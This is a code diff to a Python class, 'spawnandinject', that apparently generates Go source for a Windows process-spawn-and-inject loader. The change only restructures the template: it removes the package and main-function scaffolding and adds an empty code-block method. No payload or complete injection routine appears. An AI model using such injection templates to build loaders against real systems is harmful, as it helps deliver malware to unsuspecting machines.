@@ -17,19 +17,11 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return ["golang.org/x/sys/windows"]
 
+    def codeblocks(self) -> str:
+        return """"""
+
     def template(self) -> str:
         return Template("""
-package main
-
-import (
-{imports}
-)
-
-{codeblocks}
-
-func main() {{
-
-    
     {transformers}
 
 	// Load DLLs and Procedures
@@ -56,5 +48,4 @@ func main() {{
 	WaitForSingleObject.Call(thread, 500)
 	
     CloseHandle.Call(thread);
-}}
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
